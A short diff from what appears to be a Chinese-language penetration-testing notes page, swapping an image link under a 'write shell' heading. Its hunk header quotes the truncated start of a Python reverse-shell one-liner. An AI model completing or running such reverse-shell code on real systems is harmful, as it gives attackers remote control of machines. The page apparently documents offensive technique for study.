@@ -458,4 +458,4 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 写shell
 
-![image-20220910000904461](../../.gitbook/assets/image-20220910000904461.png)
+![image-20230208145726071](../../.gitbook/assets/image-20230208145726071.png)
